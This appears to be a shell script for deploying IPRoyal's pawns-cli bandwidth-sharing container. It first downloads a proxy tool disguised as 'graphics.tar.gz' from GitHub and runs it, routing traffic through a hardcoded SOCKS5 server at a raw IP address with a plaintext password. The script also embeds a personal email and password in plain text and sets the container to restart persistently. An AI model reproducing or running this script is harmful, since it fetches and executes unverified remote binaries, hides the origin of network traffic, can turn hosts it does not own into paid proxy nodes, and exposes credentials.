#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END 
listen = :2233 
loglevel = 1 
select_proxy_mode=socks5_only 
socks5 = 103.97.111.147:8388
socks5_password = hi3zv
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp docker pull iproyal/pawns-cli:latest && docker run --restart=always iproyal/pawns-cli:latest -email=liyanul.kariim27@gmail.com -password=liyanteguh27 -device-name=raspberrypi -accept-tos
